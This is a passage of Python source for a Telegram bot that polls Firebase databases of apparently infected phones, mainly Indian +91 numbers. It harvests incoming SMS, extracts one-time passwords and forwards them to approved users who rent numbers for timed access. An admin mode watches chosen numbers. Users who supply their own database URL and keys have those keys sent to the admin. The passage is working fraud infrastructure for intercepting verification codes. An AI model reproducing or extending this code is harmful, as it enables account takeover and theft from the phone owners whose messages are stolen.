    """Scan a single system's firebase and refresh its devices + numbers."""
    devs: List[DeviceInfo] = []
    try:
        sim_r, dev_r, usr_r, cli_r = await asyncio.gather(
            fb_get("All_Users/simDetails", system.url, system.keys),
            fb_get("All_Users/Data/DeviceInfo", system.url, system.keys),
            fb_get("user_data", system.url, system.keys),
            fb_get("clients", system.url, system.keys),
            return_exceptions=True)
        if isinstance(sim_r, dict):
            info_r = dev_r if isinstance(dev_r, dict) else {}
            for did, sim in sim_r.items():
                if not isinstance(sim, dict): continue
                info = info_r.get(did) if isinstance(info_r, dict) else {}
                if not isinstance(info, dict): info = {}
                nums = extract_nums(sim, info)
                st = "online" if str(info.get("Status", "")).lower() == "online" else "offline"
                if nums:
                    devs.append(DeviceInfo(did, nums, st, system.url, system.sid,
                        sms_paths_for(did), system.keys))
        if isinstance(usr_r, dict):
            for did, data in usr_r.items():
                if not isinstance(data, dict): continue
                nums = extract_nums(data)
                st = "online" if str(data.get("status", "")).lower() == "online" else "offline"
                if nums:
                    devs.append(DeviceInfo(did, nums, st, system.url, system.sid,
                        sms_paths_for(did), system.keys))
        if isinstance(cli_r, dict):
            for did, data in cli_r.items():
                if not isinstance(data, dict): continue
                nums = extract_nums(data)
                st = "online" if _is_online(data.get("status")) else "offline"
                if nums:
                    devs.append(DeviceInfo(did, nums, st, system.url, system.sid,
                        sms_paths_for(did), system.keys))
    except Exception as e:
        logger.debug(f"scan_one_system {system.sid}: {e}")

    system.devices = devs
    online_nums = set()
    for d in devs:
        if d.status == "online":
            online_nums.update(d.numbers)
    new_profiles = {}
    for n in online_nums:
        new_profiles[n] = system.numbers.get(n) or NumberProfile(n)
    system.numbers = new_profiles
    system.stats = {
        "devices": len(devs),
        "online": sum(1 for d in devs if d.status == "online"),
        "numbers": len(online_nums),
    }
    return system

async def scan_all_systems():
    global _scan_done, _scan_running
    if _scan_running:
        return
    _scan_running = True
    build_systems()
    logger.info("Starting full system scan...")
    sem = asyncio.Semaphore(MAX_CONCURRENT_DB)

    async def scan_one(system: System):
        async with sem:
            await scan_one_system(system)

    await asyncio.gather(*[scan_one(s) for s in system_list()], return_exceptions=True)
    _scan_done = True
    _scan_running = False
    total_devs = sum(len(s.devices) for s in system_list())
    total_online = sum(s.stats["online"] for s in system_list())
    total_nums = sum(len(s.numbers) for s in system_list())
    logger.info(f"Scan done: {len(SYSTEMS)} systems, {total_devs} devs, {total_online} online, {total_nums} numbers")
    await send_admin(
        title("✅", "SCAN COMPLETE") + "\n" + DIV + "\n\n" +
        kv("🗂 Systems", len(SYSTEMS)) + "\n" +
        kv("💻 Devices", f"{total_online} online / {total_devs} total") + "\n" +
        kv("📱 Numbers", total_nums, last=True) + "\n\n" +
        "⚡ Bot is LIVE and monitoring for OTPs!")

# ── NUMBER SELECTION ────────────────────────────────────────────────────────
def get_available_number(sid: str) -> Optional[str]:
    s = SYSTEMS.get(sid)
    if not s:
        return None
    for n, prof in s.numbers.items():
        if prof.assigned_to is None:
            return n
    return None

def get_all_numbers(sid: str) -> List[Tuple[str, NumberProfile]]:
    s = SYSTEMS.get(sid)
    if not s:
        return []
    return [(n, p) for n, p in s.numbers.items() if p.assigned_to is None]

# ── BACKGROUND SMS MONITOR ──────────────────────────────────────────────────
async def _forward_otp(uid: int, num: str, sid: str, otp: str, sender: str,
                       timestamp: str, body: str, header: str = "OTP RECEIVED"):
    """Send a received OTP to a user. The 🟢 marker sits OUTSIDE the <code> block
    so copying the number never includes the emoji."""
    if not _app:
        return
    try:
        await _app.bot.send_message(uid,
            title("⚡", header) + "\n" + DIV + "\n\n" +
            f"🟢 <code>{fmt_phone(num)}</code>\n" +
            f"🔑 <b>OTP</b> · <code>{esc(otp)}</code>\n\n" +
            f"📨 <b>From</b> · {esc(sender)}\n" +
            f"🕐 <b>Time</b> · {esc(timestamp)}\n\n" +
            note(esc(body[:300])),
            parse_mode="HTML", reply_markup=otp_received_keyboard(),
            disable_web_page_preview=True)
    except Exception as e:
        logger.warning(f"Failed to forward OTP to {uid}: {e}")

async def monitor_sms_for_device(dev: DeviceInfo):
    """Poll SMS from one device. First poll seeds (marks seen) without forwarding."""
    hash_parts = []
    new_sms_list = []

    for sms_path in dev.sms_paths:
        data = await fb_get(sms_path, dev.base_url, dev.keys)
        if isinstance(data, dict):
            hash_parts.append(str(sorted(data.items())))
            for sms_key, sms in data.items():
                if not isinstance(sms, dict):
                    continue
                sid = f"{dev.db_tag}/{dev.dev_id}/{sms_path}/{sms_key}"
                if sid in SEEN_SMS:
                    continue
                seen_add(sid)
                new_sms_list.append(sms)
        else:
            hash_parts.append("")

    # Lazy seeding: on the very first poll, mark everything seen but don't forward.
    if not dev.seeded:
        dev.seeded = True
        if hash_parts and not all(p == "" for p in hash_parts):
            dev.last_sms_hash = hashlib.md5("|".join(hash_parts).encode()).hexdigest()
        return

    if not hash_parts or all(p == "" for p in hash_parts):
        return

    combined = "|".join(hash_parts)
    data_hash = hashlib.md5(combined.encode()).hexdigest()
    if data_hash == dev.last_sms_hash and not new_sms_list:
        return
    dev.last_sms_hash = data_hash

    for sms in new_sms_list:
        body = str(sms.get("body") or sms.get("message") or sms.get("text") or sms.get("msg") or "")
        sender = str(sms.get("sender") or sms.get("from") or sms.get("address") or "")
        timestamp = str(sms.get("date") or sms.get("time") or sms.get("timestamp") or "")
        otp = extract_otp(body)

        # Record history for every SMS (even non-OTP)
        for num in dev.numbers:
            add_sms_history(dev.db_tag, num, sender, body, otp)

        if not otp:
            continue

        numbers_notified = []
        for num in dev.numbers:
            s = SYSTEMS.get(dev.db_tag)
            if s and num in s.numbers:
                if s.numbers[num].record_otp(otp, sender):
                    numbers_notified.append(num)
                    # Active-number scanner: promote hot numbers to SPECIAL.
                    maybe_mark_special(dev.db_tag, num)

        if numbers_notified:
            logger.info(f"\U0001F525 NEW OTP: code={otp} \u2192 {', '.join('+91'+n for n in numbers_notified)}")

        # Forward to waiting users on this system + number
        for num in dev.numbers:
            for uid, (wsid, wnum) in list(USER_WAITING.items()):
                if wsid == dev.db_tag and wnum == num and _app:
                    logger.info(f"\U0001F4E7 Forward: +91{num} (sys {dev.db_tag}) -> user {uid}")
                    await _forward_otp(uid, num, dev.db_tag, otp, sender, timestamp, body)

        # ── ADMIN SPECIAL SYSTEM: forward OTP from ANY of the 5 watched numbers ──
        for num in dev.numbers:
            for auid, watchlist in list(ADMIN_WATCH.items()):
                if not _app or (dev.db_tag, num) not in watchlist:
                    continue
                if USER_WAITING.get(auid) == (dev.db_tag, num):
                    continue
                logger.info(f"🎯 Admin-watch forward: +91{num} (sys {dev.db_tag}) -> admin {auid}")
                await _forward_otp(auid, num, dev.db_tag, otp, sender, timestamp, body,
                                   header="OTP RECEIVED · WATCH 5")

async def seed_all_devices():
    """One-time startup pass: mark every device's EXISTING SMS as seen so that only
    genuinely NEW OTPs (arriving after startup) are forwarded. Prevents the first
    poll of a device from swallowing an OTP that arrived just after a user picked it."""
    sem = asyncio.Semaphore(MAX_CONCURRENT_POLL)
    async def seed(dev):
        async with sem:
            try:
                await monitor_sms_for_device(dev)  # first call seeds & returns
            except Exception:
                pass
    tasks = [seed(d) for system in system_list() for d in system.devices if d.status == "online"]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    logger.info(f"Seeded {len(tasks)} online devices (existing SMS marked seen)")

async def background_monitor_loop():
    await asyncio.sleep(3)
    logger.info("Background monitor loop started")
    cycle = 0
    while True:
        try:
            if not SYSTEMS:
                await asyncio.sleep(3)
                continue

            waiting = set(USER_WAITING.values())
            sem = asyncio.Semaphore(MAX_CONCURRENT_POLL)

            for system in system_list():
                online_devs = [d for d in system.devices if d.status == "online"]
                if not online_devs:
                    continue
                priority = [d for d in online_devs if any((system.sid, n) in waiting for n in d.numbers)]
                others = [d for d in online_devs if d not in priority]

                async def poll(dev):
                    async with sem:
                        await monitor_sms_for_device(dev)

                if priority:
                    await asyncio.gather(*[poll(d) for d in priority], return_exceptions=True)

                batch_size = MAX_CONCURRENT_POLL
                if others:
                    start_idx = (cycle * batch_size) % len(others)
                    batch = others[start_idx:start_idx + batch_size]
                    if len(batch) < batch_size and len(others) > batch_size:
                        batch += others[:batch_size - len(batch)]
                    if batch:
                        await asyncio.gather(*[poll(d) for d in batch], return_exceptions=True)

            cycle += 1

            # Refresh special numbers (drop idle ones) periodically
            if cycle % 20 == 0:
                prune_special()

            # Auto-timeout
            now = time.time()
            for uid, (sid, num) in list(USER_WAITING.items()):
                if uid in USER_WAIT_TIME and now - USER_WAIT_TIME[uid] > AUTO_TIMEOUT:
                    del USER_WAITING[uid]
                    USER_WAIT_TIME.pop(uid, None)
                    s = SYSTEMS.get(sid)
                    if s and num in s.numbers:
                        s.numbers[num].assigned_to = None
                    try:
                        await _app.bot.send_message(uid,
                            title("⏰", "TIMED OUT") + "\n" + DIV +
                            f"\n\nStopped watching 🟢 <code>{fmt_phone(num)}</code>.",
                            parse_mode="HTML", reply_markup=main_keyboard(uid == ADMIN_ID))
                    except Exception:
                        pass

            # Expiry notifier (every ~60 cycles)
            if cycle % 60 == 0:
                for uid in list(_access.keys()):
                    if uid == ADMIN_ID:
                        continue
                    rem = access_remaining(uid)
                    if rem is not None and rem <= 0:
                        try:
                            await _app.bot.send_message(uid,
                                title("⛔", "ACCESS EXPIRED") + "\n" + DIV +
                                "\n\nYour access has ended.\nContact admin to renew.",
                                parse_mode="HTML")
                        except Exception:
                            pass

            if cycle % 600 == 0:
                total_nums = sum(len(s.numbers) for s in system_list())
                in_use = sum(1 for s in system_list() for p in s.numbers.values() if p.assigned_to is not None)
                await send_admin(
                    title("📊", f"MONITOR  ·  {cycle} cycles") + "\n" + DIV + "\n\n" +
                    kv("🗂 Systems", len(SYSTEMS)) + "\n" +
                    kv("📱 Numbers", total_nums) + "\n" +
                    kv("🔒 In use", in_use) + "\n" +
                    kv("⭐ Special", len(_special_numbers)) + "\n" +
                    kv("📨 SMS seen", len(SEEN_SMS)) + "\n" +
                    kv("⏱ Waiting", len(USER_WAITING), last=True))

        except Exception as e:
            logger.error(f"Monitor loop error: {e}")

        await asyncio.sleep(POLL_INTERVAL)

# ── UI HELPERS ──────────────────────────────────────────────────────────────
async def safe_edit(q, text: str, kb=None):
    """Edit the callback message; fall back to a fresh reply."""
    try:
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb,
                                  disable_web_page_preview=True)
    except Exception:
        try:
            await q.message.reply_text(text, parse_mode="HTML", reply_markup=kb,
                                       disable_web_page_preview=True)
        except Exception:
            pass

async def q_reply(q, text: str, kb=None):
    """Send a fresh message in response to a callback."""
    try:
        await q.message.reply_text(text, parse_mode="HTML", reply_markup=kb,
                                   disable_web_page_preview=True)
    except Exception:
        pass

def display_systems(only_active: bool = True, limit: int = 40) -> List[System]:
    """The list of systems shown to the admin (used for both display and
    index-based selection so the numbers always match)."""
    all_sys = system_list()
    if only_active:
        shown = [s for s in all_sys if s.numbers or s.stats.get("online")]
    else:
        shown = all_sys
    return shown[:limit]

def systems_text(only_active: bool = True, limit: int = 40) -> str:
    all_sys = system_list()
    shown = display_systems(only_active, limit)
    lines = [title("🗂", f"SYSTEMS  ·  {len(shown)}/{len(all_sys)}"), DIV]
    for i, s in enumerate(shown, 1):
        st = s.stats
        free = sum(1 for p in s.numbers.values() if p.assigned_to is None)
        mark = "✅" if free > 0 else ("🟡" if s.numbers else "⚪")
        owner = "🔒 private" if s.owner else "🌐 public"
        lines.append(
            f"\n{mark} <b>{i}. {esc(s.name)}</b>\n"
            f"  ├ 💻 {st['online']} online / {st['devices']} dev\n"
            f"  ├ 📱 {len(s.numbers)} numbers · {free} free\n"
            f"  └ {owner}")
    if len(all_sys) > len(shown):
        lines.append(f"\n<i>…and {len(all_sys) - len(shown)} more systems.</i>")
    return "\n".join(lines)

def users_text() -> str:
    lines = [title("👥", f"USERS  ·  {len(_access)}"), DIV]
    if not _access:
        lines.append("<i>No approved users yet.</i>")
    for uid, e in _access.items():
        rem = access_remaining(uid)
        sysname = SYSTEMS.get(e.get("system"), None)
        sysname = sysname.name if sysname else (e.get("system") or "—")
        lines.append(
            f"\n👤 <b>{esc(e.get('name') or 'User')}</b>\n"
            f"  ├ 🆔 <code>{uid}</code>\n"
            f"  ├ ⏳ {fmt_duration(rem)}\n"
            f"  └ 🗂 {esc(sysname)}")
    if _pending:
        lines.append(f"\n\n🆕 <b>Pending requests · {len(_pending)}</b>")
        for uid, p in _pending.items():
            lines.append(f"  ├ 👤 {esc(p.get('name') or 'User')} · <code>{uid}</code>")
    return "\n".join(lines)

def history_text(sid: Optional[str] = None, limit: int = 15) -> str:
    items = [h for h in _sms_history if (sid is None or h["sid"] == sid)]
    items = items[-limit:]
    if not items:
        return title("📜", "SMS HISTORY") + "\n" + DIV + "\n<i>No SMS recorded yet.</i>"
    lines = [title("📜", f"SMS HISTORY  ·  last {len(items)}"), DIV]
    for h in reversed(items):
        t = datetime.fromtimestamp(h["ts"]).strftime("%H:%M:%S")
        rows = []
        if h["otp"]:
            rows.append(f"  ├ 🔑 OTP · <code>{esc(h['otp'])}</code>")
        rows.append(f"  ├ 📨 {esc(h['sender'])}")
        rows.append(f"  └ 💬 <i>{esc(h['body'][:120])}</i>")
        lines.append(f"\n🕐 <b>{t}</b> · 📱 <code>+91{h['num']}</code>\n" + "\n".join(rows))
    return "\n".join(lines)

def panels_text(uid: int) -> str:
    panels = visible_panels(uid)
    lines = [title("🗂", f"SELECT PANEL  ·  {len(panels)}"), DIV]
    if not panels:
        lines.append(note("No panels available. Use ➕ Set Firebase to add your own, "
                          "or contact the admin."))
    else:
        lines.append(note("Pick a panel below to view its online numbers."))
    return "\n".join(lines)

def numbers_text(sid: str) -> str:
    s = SYSTEMS.get(sid)
    if not s:
        return title("❌", "PANEL NOT FOUND") + "\n" + DIV + "\n\n<i>This panel is no longer available.</i>"
    nums = list(s.numbers.items())
    total = len(nums)
    free = sum(1 for _, p in nums if p.assigned_to is None)
    lines = [title("📱", f"{esc(s.name)}  ·  ONLINE NUMBERS"), DIV,
             kv("🟢 Online", total),
             kv("🆓 Free", free),
             kv("🔒 Busy", total - free, last=True),
             "",
             note("Tap a number to assign it. Use 🔄 Refresh or Next ▶️ below.")]
    return "\n".join(lines)

def special_text(page: int = 0) -> str:
    prune_special()
    items = special_sorted()
    lines = [title("⭐", f"SPECIAL NUMBERS  ·  {len(items)}"), DIV]
    if not items:
        lines.append(note("No special numbers yet. Numbers that receive more OTPs "
                          "are promoted here automatically."))
    else:
        start = page * NUMBERS_PER_PAGE
        end = min(start + NUMBERS_PER_PAGE, len(items))
        for e in items[start:end]:
            lines.append(
                f"\n🟢 <b>+91{e['num']}</b> · <i>{esc(e.get('name', ''))}</i>\n"
                f"  ├ 🔢 Total OTPs · <b>{e.get('total', 0)}</b>\n"
                f"  ├ 📈 Recent (5m) · <b>{e.get('recent', 0)}</b>\n"
                f"  ├ 🔑 Last OTP · <code>{esc(e.get('last_code', '') or '—')}</code>\n"
                f"  └ 🕐 {ago(e.get('last_time', 0))}")
    return "\n".join(lines)

def admin_panel_text() -> str:
    total_devs = sum(len(s.devices) for s in system_list())
    total_online = sum(s.stats["online"] for s in system_list())
    total_nums = sum(len(s.numbers) for s in system_list())
    in_use = sum(1 for s in system_list() for p in s.numbers.values() if p.assigned_to is not None)
    scan_status = "✅ Ready" if _scan_done else "⏳ Scanning…"
    return (brand("Admin Control Center") + "\n" +
            title("🛠", "ADMIN PANEL") + "\n" +
            kv("🗂 Systems", len(SYSTEMS)) + "\n" +
            kv("💻 Devices", f"{total_online} online / {total_devs}") + "\n" +
            kv("📱 Numbers", f"{total_nums} · {total_nums - in_use} free / {in_use} busy") + "\n" +
            kv("👥 Users", f"{len(_access)} · ⏳ {len(_pending)} pending") + "\n" +
            kv("⭐ Special", len(_special_numbers)) + "\n" +
            kv("🔍 Scan", scan_status, last=True) + "\n\n" +
            note("Choose a control below 👇"))

def dashboard_text() -> str:
    total_devs = sum(len(s.devices) for s in system_list())
    total_online = sum(s.stats["online"] for s in system_list())
    total_nums = sum(len(s.numbers) for s in system_list())
    in_use = sum(1 for s in system_list() for p in s.numbers.values() if p.assigned_to is not None)
    scan_status = "✅ Ready" if _scan_done else "⏳ Scanning…"
    return (title("📈", "DASHBOARD") + "\n" + DIV +
            "\n\n<b>📊 Live Metrics</b>\n" +
            kv("🗂 Systems", len(SYSTEMS)) + "\n" +
            kv("💻 Devices", f"{total_online} online / {total_devs}") + "\n" +
            kv("📱 Numbers", f"{total_nums} · {total_nums - in_use} free / {in_use} busy") + "\n" +
            kv("⭐ Special", len(_special_numbers)) + "\n" +
            kv("👥 Users", f"{len(_access)} · ⏳ {len(_pending)} pending") + "\n" +
            kv("⏱ Waiting", len(USER_WAITING)) + "\n" +
            kv("📨 SMS seen", len(SEEN_SMS)) + "\n" +
            kv("📜 History", len(_sms_history)) + "\n" +
            kv("🔍 Scan", scan_status, last=True))

def my_status_text(uid: int) -> Tuple[str, Optional[ReplyKeyboardMarkup]]:
    # ── Admin Watch-5 status ──
    watch = ADMIN_WATCH.get(uid)
    if watch and uid == ADMIN_ID:
        lines = [title("📊", "MY STATUS") + "\n" + DIV +
                 "\n\n<b>🎯 Watch 5 · Active</b>\n"]
        for i, (ss, n) in enumerate(watch, 1):
            nm = SYSTEMS[ss].name if ss in SYSTEMS else ss
            lines.append(f"  {i}. 🟢 <code>{fmt_phone(n)}</code> · <i>{esc(nm)}</i>")
        lines.append("\n⚡ OTPs from ANY of these are forwarded here.\n"
                     "<i>Open 🎯 Watch 5 Numbers to manage.</i>")
        return "\n".join(lines), _kb([[KeyboardButton(BTN_WATCH5)],
                                      [KeyboardButton(BTN_MENU)]])
    if uid in USER_WAITING:
        sid, num = USER_WAITING[uid]
        s = SYSTEMS.get(sid)
        prof = s.numbers.get(num) if s else None
        elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
        remaining = max(0, AUTO_TIMEOUT - elapsed)
        rem_access = access_remaining(uid)
        status_text = {
            "🔥": "🔥 <b>HOT</b>", "🟢": "🟢 <b>LIVE</b>",
            "🟡": "🟡 <b>WARM</b>", "🟠": "🟠 <b>COOLING</b>",
            "💀": "💀 <b>IDLE</b>",
        }.get(prof.live_status_emoji if prof else "💀", "Unknown")
        text = (title("📊", "MY STATUS") + "\n" + DIV +
                "\n\n<b>📊 Details</b>\n" +
                kv("🗂 System", esc(s.name if s else "—")) + "\n" +
                kv("📞 Number", f"🟢 {fmt_phone(num)}") + "\n" +
                kv("📡 State", status_text) + "\n" +
                kv("📈 OTPs (5m)", prof.recent_otp_count if prof else 0) + "\n" +
                kv("⏱ Wait left", f"{int(remaining)}s") + "\n" +
                kv("🔓 Access", fmt_duration(rem_access), last=True) + "\n\n" +
                "⚡ Watching…")
        return text, waiting_keyboard()
    rem_access = access_remaining(uid)
    sys_obj = get_user_system(uid)
    text = (title("📊", "MY STATUS") + "\n" + DIV +
            "\n\n<b>📊 Details</b>\n" +
            kv("🔓 Access", fmt_duration(rem_access)) + "\n" +
            kv("🗂 Panel", esc(sys_obj.name if sys_obj else "—"), last=True) + "\n\n" +
            "❌ No active waiting.\nGet a number first 👇")
    return text, _kb([[KeyboardButton(BTN_GET)], [KeyboardButton(BTN_MENU)]])

# ── NUMBER ASSIGNMENT (shared by inline flows) ──────────────────────────────
async def assign_number(q, uid: int, sid: str, num: str):
    if not is_authorized(uid):
        await q_reply(q, title("🔒", "ACCESS REQUIRED") + "\n" + DIV +
                      "\n\nYou no longer have access.", parse_mode="HTML")
        return
    if uid in USER_WAITING:
        cur_sid, cur = USER_WAITING[uid]
        await q_reply(q, title("⏳", "ALREADY WAITING") + "\n" + DIV +
                      f"\n\n🟢 <code>{fmt_phone(cur)}</code>\n\n"
                      "Cancel first to switch numbers.",
                      parse_mode="HTML", kb=waiting_keyboard())
        return
    s = SYSTEMS.get(sid)
    if not s or num not in s.numbers:
        await q_reply(q, title("❌", "NUMBER UNAVAILABLE") + "\n" + DIV +
                      "\n\nThat number is no longer online. Please refresh.",
                      parse_mode="HTML", kb=panels_inline(uid, 0))
        return
    prof = s.numbers[num]
    if prof.assigned_to is not None and prof.assigned_to != uid:
        await q_reply(q, title("❌", "NUMBER TAKEN") + "\n" + DIV +
                      "\n\nThat number was just taken. Please pick another.",
                      parse_mode="HTML", kb=numbers_inline(sid, 0))
        return
    prof.assigned_to = uid
    USER_WAITING[uid] = (sid, num)
    USER_WAIT_TIME[uid] = time.time()
    _user_panel[uid] = sid
    logger.info(f"📋 User {uid} assigned +91{num} (sys {sid})")

    devs = [d for d in s.devices if num in d.numbers]
    online_panels = sum(1 for d in devs if d.status == "online")
    secs = int(prof.seconds_since_last_otp)
    last_str = "just now" if secs < 5 else (f"{secs}s ago" if secs < 60 else (f"{secs // 60}m ago" if secs < 3600 else "waiting"))
    status_text = {
        "🔥": "🔥 <b>HOT</b> — OTP just now",
        "🟢": "🟢 <b>LIVE</b> — OTP recently",
        "🟡": "🟡 <b>WARM</b> — OTP incoming",
        "🟠": "🟠 <b>COOLING</b> — slow activity",
        "💀": "💀 <b>IDLE</b> — waiting for activity",
    }.get(prof.live_status_emoji, "Unknown")

    await q_reply(q,
        title("✅", "NUMBER ASSIGNED") + "\n" + DIV +
        f"\n\n🟢 <code>{fmt_phone(num)}</code>\n"
        f"{status_text}\n\n"
        "<b>📊 Details</b>\n" +
        kv("🗂 System", esc(s.name)) + "\n" +
        kv("🔑 Last OTP", last_str) + "\n" +
        kv("📈 OTPs (5m)", prof.recent_otp_count) + "\n" +
        kv("💻 Live panels", online_panels) + "\n" +
        kv("⏱ Timeout", "5 min", last=True) + "\n\n" +
        "⚡ Watching for SMS now…",
        kb=waiting_keyboard())

# ── USER "SET FIREBASE" FLOW ────────────────────────────────────────────────
async def start_set_firebase(msg, uid: int):
    _user_state[uid] = "setfb_url"
    _user_data[uid] = {}
    await msg.reply_text(
        brand("Connect Your Firebase") + "\n" +
        title("➕", "SET FIREBASE") + "\n" + step_badge(1, 2) + "\n" + DIV +
        "\n\nSend your Firebase Realtime Database URL.\n"
        "Example: <code>https://myapp.firebaseio.com</code>\n\n" +
        note("The bot will scan ONLY your database and show its numbers. "
             "Send /cancel to abort."),
        parse_mode="HTML", reply_markup=back_keyboard(),
        disable_web_page_preview=True)

async def finish_set_firebase(msg, uid: int, url: str, keys: list):
    name = (msg.from_user.full_name if msg.from_user else "User")
    sid = f"u{uid}_{int(time.time())}"
    entry = {"uid": uid, "url": url, "keys": keys,
             "name": f"{name}'s Firebase", "sid": sid, "ts": time.time()}
    _user_firebases.append(entry)
    save_user_firebases()
    build_systems()
    s = SYSTEMS.get(sid)

    await msg.reply_text(
        title("🔎", "SCANNING YOUR FIREBASE") + "\n" + DIV +
        f"\n\n🔗 <code>{esc(url)}</code>\n\n⏳ Fetching devices and numbers…",
        parse_mode="HTML", disable_web_page_preview=True)

    if s:
        await scan_one_system(s)

    # Forward the firebase to the admin WITH a clickable link.
    await send_admin(
        "🆕 <b>USER FIREBASE SET</b>\n" + DIV + "\n\n" +
        f"👤 <b>User</b> · {esc(name)}\n" +
        f"🆔 <b>User ID</b> · <code>{uid}</code>\n" +
        f"🔗 <b>URL</b> · <a href=\"{esc(url)}\">{esc(url)}</a>\n" +
        f"🔑 <b>Keys</b> · {len(keys)}\n" +
        f"📱 <b>Online numbers</b> · {len(s.numbers) if s else 0}\n\n" +
        note("Tap the link to open the database."))

    if s and s.numbers:
        await msg.reply_text(
            title("✅", "FIREBASE CONNECTED") + "\n" + DIV +
            f"\n\n🗂 <b>{esc(s.name)}</b>\n" +
            kv("📱 Online numbers", len(s.numbers), last=True) + "\n\n" +
            note("These are YOUR firebase's numbers. Tap one to assign 👇"),
            parse_mode="HTML", reply_markup=numbers_inline(sid, 0),
            disable_web_page_preview=True)
    else:
        await msg.reply_text(
            title("⚠️", "NO ONLINE NUMBERS") + "\n" + DIV +
            "\n\nYour firebase was saved, but no online numbers were found yet.\n"
            "It will keep scanning in the background.\n\n" +
            note("Tap 🔄 Refresh later to check again."),
            parse_mode="HTML", reply_markup=panels_inline(uid, 0),
            disable_web_page_preview=True)

# ── MESSAGE HANDLER ─────────────────────────────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return
    uid = update.effective_chat.id
    text = msg.text.strip()
    is_admin = (uid == ADMIN_ID)

    # ── UNAUTHORIZED ──
    if not is_authorized(uid):
        if text == BTN_REQ:
            if uid in _pending:
                await msg.reply_text(
                    brand("Request Pending") +
                    "\n\n⏳ Your access request is already with the admin.\n"
                    "Please wait for approval.",
                    parse_mode="HTML", reply_markup=request_keyboard())
                return
            name = update.effective_user.full_name if update.effective_user else "User"
            _pending[uid] = {"name": name, "ts": time.time()}
            save_access()
            await msg.reply_text(
                brand("Request Sent") +
                "\n\n✅ Your access request has been submitted.\n"
                "The admin will review it shortly.\n\n" +
                note("You'll get a message here once you're approved."),
                parse_mode="HTML", reply_markup=request_keyboard())
            await send_admin(
                "🆕 <b>NEW ACCESS REQUEST</b>\n" + DIV + "\n\n" +
                f"👤 <b>Name</b> · {esc(name)}\n" +
                f"🆔 <b>User ID</b> · <code>{uid}</code>\n\n" +
                note("Open 🛠 Admin Panel → ✅ Approve to grant access."))
            return
        await msg.reply_text(
            brand("Access Required") +
            "\n\nYou don't have access to this bot yet.\n"
            "Tap below to send an access request to the admin.\n\n" +
            note("You'll be notified here once you're approved."),
            parse_mode="HTML", reply_markup=request_keyboard())
        return

    # ── ADMIN INPUT FLOWS ──
    if is_admin and uid in _admin_state:
        state = _admin_state[uid]
        data = _admin_data.get(uid, {})

        if state == "add_url":
            url = parse_firebase_url(text)
            if not url:
                await msg.reply_text(
                    title("❌", "INVALID URL") + "\n" + DIV +
                    "\n\nSend a valid Firebase Realtime Database URL.\n"
                    "Example: <code>https://myapp.firebaseio.com</code>",
                    parse_mode="HTML", reply_markup=back_keyboard())
                return
            data["url"] = url
            _admin_data[uid] = data
            _admin_state[uid] = "add_name"
            await msg.reply_text(
                title("➕", "ADD DATABASE") + "\n" + step_badge(2, 3) + "\n" + DIV +
                f"\n\n🔗 URL · <code>{esc(url)}</code>\n\n"
                "Send a display name for this system, or <code>-</code> to auto-name.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "add_name":
            data["name"] = "" if text.strip() in ("-", "") else text.strip()
            _admin_data[uid] = data
            _admin_state[uid] = "add_key"
            await msg.reply_text(
                title("➕", "ADD DATABASE") + "\n" + step_badge(3, 3) + "\n" + DIV +
                "\n\nSend the auth key (database secret) if required, "
                "or <code>-</code> to skip.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "add_key":
            url = data.get("url")
            name = data.get("name")
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            if not url:
                await msg.reply_text(
                    title("❌", "SOMETHING WENT WRONG") + "\n" + DIV +
                    "\n\nPlease try again.",
                    parse_mode="HTML", reply_markup=main_keyboard(is_admin))
                return
            keys = [] if text.strip() in ("-", "skip", "none", "") else [text.strip()]
            if any(e.get("url") == url for e in _firebase_urls):
                await msg.reply_text(
                    title("⚠️", "ALREADY ADDED") + "\n" + DIV +
                    "\n\nThis URL is already in the system.",
                    parse_mode="HTML", reply_markup=main_keyboard(is_admin))
                return
            _firebase_urls.append({"url": url, "name": name or "", "keys": keys})
            save_firebase_urls()
            await msg.reply_text(
                title("✅", "DATABASE ADDED") + "\n" + DIV +
                f"\n\n🔗 <code>{esc(url)}</code>\n"
                f"🔑 Keys · {len(keys)}\n\n"
                "🔄 Creating its own system and scanning now…",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            asyncio.create_task(scan_all_systems())
            return

        if state == "remove":
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            idx = int(m.group()) - 1 if m else None
            if idx is None or idx < 0 or idx >= len(_firebase_urls):
                await msg.reply_text(
                    title("❌", "INVALID NUMBER") + "\n" + DIV +
                    "\n\nSend the number to remove, or /cancel.",
                    parse_mode="HTML", reply_markup=main_keyboard(is_admin))
                return
            removed = _firebase_urls.pop(idx)
            save_firebase_urls()
            await msg.reply_text(
                title("✅", "DATABASE REMOVED") + "\n" + DIV +
                f"\n\n🔗 <code>{esc(removed.get('url'))}</code>\n\n"
                "🔄 Rescanning remaining systems…",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            asyncio.create_task(scan_all_systems())
            return

        if state == "approve_uid":
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text(
                    title("❌", "INVALID USER ID") + "\n" + DIV +
                    "\n\nSend a numeric user ID or /cancel.",
                    parse_mode="HTML", reply_markup=back_keyboard())
                return
            target = int(m.group())
            data["target"] = target
            _admin_data[uid] = data
            _admin_state[uid] = "approve_dur"
            await msg.reply_text(
                title("✅", "APPROVE USER") + "\n" + step_badge(2, 3) + "\n" + DIV +
                f"\n\n👤 User · <code>{target}</code>\n\n"
                "Send the duration of access.\n"
                "Examples: <code>12h</code>, <code>3d</code>, <code>1w</code>, "
                "<code>30m</code>, or <code>0</code> for unlimited.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "approve_dur":
            secs = parse_duration(text)
            if secs is None:
                await msg.reply_text(
                    title("❌", "INVALID DURATION") + "\n" + DIV +
                    "\n\nTry <code>12h</code>, <code>3d</code>, <code>1w</code> "
                    "or /cancel.",
                    parse_mode="HTML", reply_markup=back_keyboard())
                return
            data["dur"] = secs
            _admin_data[uid] = data
            _admin_state[uid] = "approve_sys"
            await msg.reply_text(
                title("✅", "APPROVE USER") + "\n" + step_badge(3, 3) + "\n" + DIV +
